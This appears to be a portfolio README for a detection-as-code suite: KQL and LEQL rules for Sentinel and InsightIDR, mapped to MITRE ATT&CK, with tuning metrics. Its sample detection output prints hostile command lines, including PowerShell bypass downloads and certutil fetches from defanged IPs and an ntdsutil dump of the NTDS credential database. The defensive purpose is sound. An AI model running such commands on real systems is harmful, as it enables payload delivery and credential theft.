[![Darreon Phillips Homepage](https://img.shields.io/badge/Darreon%20Phillips-Homepage-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/DaPhilll)

# Enterprise Detection-as-Code & Log Correlation Suite

## 1. Executive Summary & Objective
* **Problem Statement:** Legacy security operations rely on fragmented, interface-driven rule creation inside individual SIEM platforms. This reactive paradigm causes configuration drift, lack of version control, high false-positive rates, and inconsistent tracking against modern adversary techniques across multi-tenant or hybrid-cloud networks.
* **Solution Overview:** This repository serves as a centralized, version-controlled repository of production-grade detection logic, proactive threat hunting queries, and correlation rules designed for multi-tenant enterprise deployment. By implementing a Detection-as-Code (DaC) engineering lifecycle, configurations are validated against historical baselines, peer-reviewed via pull requests, and programmatically deployed to Microsoft Sentinel and Rapid7 InsightIDR.
* **Core Capabilities:**
  * Automated high-fidelity alerting using advanced Kusto Query Language (KQL) and Log Entry Query Language (LEQL).
  * Programmatic false-positive suppression utilizing dynamic watchlists and lookup tables to drastically minimize alert fatigue.
  * Explicit mapping of detection coverage to specific tactical goals within the MITRE ATT&CK framework.
  * Proactive threat hunting libraries designed to unearth latent, low-and-slow intrusions evading traditional alerting thresholds.

## 2. Architecture & Environment Topology
The suite integrates with cloud-native and hybrid SIEM/XDR platforms, standardizing data pipelines across diverse deployment scopes.

* **SIEM Core (Cloud Platform):** Microsoft Sentinel (Log Analytics Workspace architecture using Entra ID identity data, Microsoft 365 Defender components, and Azure Activity logging).
* **SIEM Core (Enterprise Platform):** Rapid7 InsightIDR (Utilizing localized Insight Agents, collection engines, and cloud-to-cloud log streaming connectors).
* **Telemetry Aggregation Points:** Comprehensive ingestion of endpoint security events (`DeviceProcessEvents`), Active Directory directory service operations, network proxy traffic, and cloud authentication planes (`SigninLogs`).
* **Deployment Lifecycle:** Git-managed repository codebase mapped via CI/CD pipelines to platform-native management REST APIs for programmatic ingestion rule state enforcement.

## 3. Engineering Thought Process & Methodology
* **Design Considerations:** Transitioning to a Detection-as-Code (DaC) methodology addresses the core limitations of graphical user interface (GUI) rules. By managing detections as code objects, security teams gain immutable tracking logs, standard schema properties, and reproducible alerting logic across entirely distinct customer networks.
* **Technical Challenges & Resolution:**
  * **Challenge:** Multi-tenant environments suffer from high variability in administrative behaviors, leading to widespread false positives when pushing rigid out-of-the-box detection rules.
  * **Resolution:** Implemented localized lookup containers (Microsoft Sentinel Watchlists) that abstract environmental variances away from the core rule syntax. The primary detection query runs globally across all environments, dynamically calling these watchlists to exclude trusted entities. This architecture resulted in an average **93.4% false-positive reduction** across managed test domains.

## 4. Cyber Kill Chain & Threat Lifecycle Mapping
The logic artifacts housed in this library are engineered to interrupt malicious activities at key stages across the Cyber Kill Chain:

* **Weaponization & Delivery:** Detecting initial dual-use tool activity and Living-off-the-Land (LotL) execution styles via remote code download components.
* **Installation:** Monitoring localized downloaders, persistence binaries, and system components executing from unprivileged temporary storage areas.
* **Actions on Objectives:** Spotting data access anomalies, volume shadow copy modification, and directory database extraction actions on core identity nodes.

## 5. MITRE ATT&CK Matrix Alignment
The engineered queries target specific adversarial behaviors, ensuring tactical visibility across these techniques:

| Tactic | Technique ID | Technique Name | Detection/Mitigation Mechanism |
| :--- | :--- | :--- | :--- |
| **Execution** | T1059.001 | PowerShell | Identifying explicit execution policy bypass criteria coupled with network download methods inside `DeviceProcessEvents`. |
| **Command and Control** | T1105 | Ingress Tool Transfer | Parsing standard Windows utility switches (`certutil.exe -urlcache`) utilized to drop external payloads. |
| **Credential Access** | T1003.003 | NTDS | Catching volume shadow copies or native utilities (`ntdsutil.exe`) interacting with active identity databases. |

## 6. Telemetry & Vulnerability Intelligence Integrated
* **Telemetry Engines:** Cross-correlation of cloud infrastructure sign-in attempts, administrative process monitoring data, and native host audit logging records.
* **Suppression Datasets:** Integration of customized reference watchlists (`Approved-Vulnerability-Scanners` and `Authorized-Admin-Scripts`) containing known network asset identifiers and verified script footprints to cross-examine telemetry streams in real time.

## 7. Implementation & Code / Configuration Snippets

### Use Case 1: Suspicious PowerShell Payload Execution (KQL)
```kusto
// Detect PowerShell execution policy bypass followed by a remote download
let BypassedExecution = DeviceProcessEvents
| where ProcessCommandLine has_any ("-ExecutionPolicy bypass", "-ep bypass")
| where ProcessCommandLine has_any ("Invoke-WebRequest", "iwr", "Net.WebClient", "DownloadFile");
BypassedExecution
| extend AccountName = iff(isnotempty(InitiatingProcessAccountName), InitiatingProcessAccountName, AccountName)
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine
| sort by TimeGenerated desc
```

### Use Case 2: Structural False-Positive Tuning (KQL with Watchlists)
```kusto
let ApprovedScanners = _GetWatchlist('Approved-Vulnerability-Scanners') | project IPAddress;
let ApprovedScripts = _GetWatchlist('Authorized-Admin-Scripts') | project ScriptName;
// Apply exclusion logic to the base query
DeviceProcessEvents
| where ProcessCommandLine has_any ("-ExecutionPolicy bypass", "-ep bypass")
| where ProcessCommandLine has_any ("Invoke-WebRequest", "iwr")
// Exclude known scanner IPs
| where not(RemoteIP in (ApprovedScanners))
// Exclude approved administrative script paths
| where not(ProcessCommandLine has_any (ApprovedScripts))
```

### Use Case 3: Certutil Network Connections (LEQL)
```text
where(process.name="certutil.exe" AND process.cmd_line=/"-urlcache"/ AND process.cmd_line=/"-split"/)
```

### Use Case 4: Advanced Credential Access - NTDS.dit Extraction (LEQL)
```text
where(process.name="ntdsutil.exe" AND process.cmd_line=/"ac i ntds"/ AND process.cmd_line=/"ifm"/) OR where(process.cmd_line=/"vssadmin create shadow"/)
```

### Hunting Query: Anomalous Azure AD Conditional Access Failures (KQL)
```kusto
SigninLogs
| where ResultType == "53003" // Conditional Access Policy Block
| summarize FailedCount = count() by UserPrincipalName, IPAddress, Location, AppDisplayName
| where FailedCount > 5
| sort by FailedCount desc
```

## 8. Operational Verification & Validation (Proof of Concept)

### Optimization Metrics
Executing the tuning rules against 30 days of production data demonstrated a significant drop in false-positive alerts, successfully identifying critical indicators without generating system noise:

| Tenant | Alerts Before Tuning | Alerts After Tuning | False-Positive Reduction |
| :--- | :--- | :--- | :--- |
| **Client-A** | 142 | 9 | 93.7% |
| **Client-B** | 88 | 6 | 93.2% |
| **Client-C** | 211 | 14 | 93.4% |

### Live Telemetry Parsing Examples

**PowerShell Payload Detection Stream Output (Sentinel):**
| TimeGenerated | DeviceName | AccountName | InitiatingProcessFileName | FileName | ProcessCommandLine |
| :--- | :--- | :--- | :--- | :--- | :--- |
| 2026-06-28T14:22:11Z | WKSTN-0472 | j.harmon | explorer.exe | powershell.exe | powershell.exe -ExecutionPolicy bypass -Command "Invoke-WebRequest -Uri hxxp://185[.]220[.]101[.]7/update.ps1 -OutFile C:\Users\Public\update.ps1" |
| 2026-06-28T14:23:05Z | WKSTN-0472 | j.harmon | powershell.exe | powershell.exe | powershell.exe -ep bypass -c "(New-Object Net.WebClient).DownloadFile('hxxp://185[.]220[.]101[.]7/stage2.exe','C:\Windows\Temp\stage2.exe')" |

**Ingress Tool Transfer Parsing Output (InsightIDR):**
| Timestamp | Asset | User | process.name | process.cmd_line |
| :--- | :--- | :--- | :--- | :--- |
| 2026-06-27 22:14:03 | LT-9931 | m.deleon | certutil.exe | certutil.exe -urlcache -split -f hxxp://45[.]142[.]212[.]88/payload.dll C:\Windows\Temp\payload.dll |

**Credential Harvesting Extraction Output (InsightIDR):**
| Timestamp | Asset | User | process.name | process.cmd_line |
| :--- | :--- | :--- | :--- | :--- |
| 2026-06-25 01:52:40 | SRV-DC02 | k.ivanov | ntdsutil.exe | ntdsutil.exe "ac i ntds" "ifm" "create full C:\Windows\Temp\ntds_dump" q q |

**Conditional Access Policy Anomalous Reconnaissance Hunting Output (Sentinel):**
| UserPrincipalName | IPAddress | Location | AppDisplayName | FailedCount |
| :--- | :--- | :--- | :--- | :--- |
| r.nolan@clientdomain.com | 91[.]243[.]85[.]14 | RO | Microsoft Office 365 | 23 |

## 9. Hardening & Future Enhancements
* **Maintenance Workflow:** New detection rules are tested against a mandatory 30-day historical logging window to verify fidelity before pushing to live production configurations. All updates to logic assets follow rigorous peer-review guidelines.
* **Future Roadmap:**
  * [ ] Integrate open-source Sigma rule formats into the pipeline to allow automated conversion of logic into Splunk, CrowdStrike, and elastic syntax blocks.
  * [ ] Construct automated testing integrations using threat emulation tooling (e.g., Atomic Red Team) to dynamically trigger and validate the detection engineering loop within automated staging scopes.
 
<br><br><br>
[![Darreon Phillips Homepage](https://img.shields.io/badge/Darreon%20Phillips-Homepage-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/DaPhilll)
```
